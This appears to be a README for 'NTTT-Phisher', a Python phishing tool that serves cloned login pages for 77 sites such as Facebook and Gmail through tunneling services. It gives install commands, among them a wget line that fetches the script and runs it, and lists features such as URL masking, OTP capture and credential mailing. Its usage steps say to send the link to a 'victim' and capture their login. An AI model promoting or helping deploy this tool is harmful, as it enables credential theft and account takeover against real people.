<h1 align="center"NTTT-Phisher</h1>


### [√] Description :

***Ultimate phishing tool in python. Includes popular websites like facebook, twitter, instagram, github, reddit, gmail and many others.***

### [+] Installation

##### Install dependencies (git, python, php ssh)

 - For Debian (Ubuntu, Kali-Linux, Parrot)
    - ```sudo apt install git python3 python3-pip php openssh-client -y```
 - For Arch (Manjaro)
    - ```sudo pacman -S git python3 python-pip php openssh --noconfirm```
 - For Redhat(Fedora)
    - ```sudo dnf install git python3 php openssh -y```
 - For Termux
    - ```pkg install git python3 python-pip php openssh -y```

##### Clone this repository

 - ```git clone https://github.com/KAR13MA09/NTTT```

##### Enter the directory
 - ```cd NTTT```

##### Install all modules
 - ```pip3 install -r files/requirements.txt --break-system-packages```

##### Run the tool
 - ```python3 NTTT.py```

#### Or, directly run
```
wget https://raw.githubusercontent.com/KAR13MA09/NTTT/main/NTTT.py && python3 NTTT.py

```

### Pip
 - `pip3 install NTTT` [For Termux]
 - `sudo pip3 install NTTT  --break-system-packages` [For Linux]
 - `NTTT`

### Docker

 - `sudo docker pull KAR13MA09/NTTT`
 - `sudo docker run --rm -it KAR13MA09/NTTT'

### Support

OS         | Support Level
-----------|--------------
Linux      | Excellent
Android    | Excellent
iPhone     | Alpha (Recommended docker)
MacOS      | Alpha (Recommended docker)
Windows    | Unsupported (Use docker/virtual-box/vmware)
BSD        | Never tested

#### Options

```
usage:NTTT.py [-h] [-p PORT] [-o OPTION] [-t TUNNELER]
                    [-r REGION] [-s SUBDOMAIN] [-u URL] [-m MODE]
                    [-e TROUBLESHOOT] [--nokey] [--noupdate]

options:
  -h, --help            show this help message and exit
  -p PORT, --port PORTP  NTTT-Phisher's server port [Default : 8080]
  -o OPTION, --option OPTION
                        NTTT's template index [Default : null]
  -t TUNNELER, --tunneler TUNNELER
                        Tunneler to be chosen while url shortening
                        [Default : Cloudflared]
  -r REGION, --region REGION
                        Region for loclx [Default: auto]
  -s SUBDOMAIN, --subdomain SUBDOMAIN
                        Subdomain for loclx [Pro Account]
                        (Default: null)
  -u URL, --url URL     Redirection url after data capture [Default :
                        null]
  -m MODE, --mode MODE  Mode of NTTT [Default: normal]
  -e TROUBLESHOOT, --troubleshoot TROUBLESHOOT
                        Troubleshoot a tunneler [Default: null]
  --nokey               Use localtunnel without ssh key [Default:
                        False]
  --noupdate            Skip update checking [Default : False]
```

### Features:

 - Multi platform (Supports most linux)
 - Easy to use
 - Possible error diagnoser
 - 77 Website templates
 - Concurrent 4 tunneling (Cloudflared, Loclx and LocalHostRun, Serveo)
 - Upto 8 links for phishing
 - OTP Support
 - Argument support
 - Credentials mailing
 - Built-in masking of URL
 - Custom masking of URL
 - URL Shadowing
 - Redirection URL settings
 - Portable file (Can be run from any directory)
 - Get IP Address and many other details along with login credentials

### Requirements

 - `Python(3)`
   - `requests`
   - `rich`
   - `beautifulsoup4`
 - `PHP`
 - `SSH`
 - 900MB storage
 
If not found, php and python modoules will be installed on first run

#### Tested on

 - `Termux`
 - `Ubuntu`
 - `Kali-Linux`
 - `Arch`
 - `Fedora`
 - `Manjaro`

## Usage

1. Run the script
2. Choose a Website
3. Wait sometimes for setting up all
4. Send the generated link to victim
5. Wait for victim login. As soon as he/she logs in, credentials will be captured



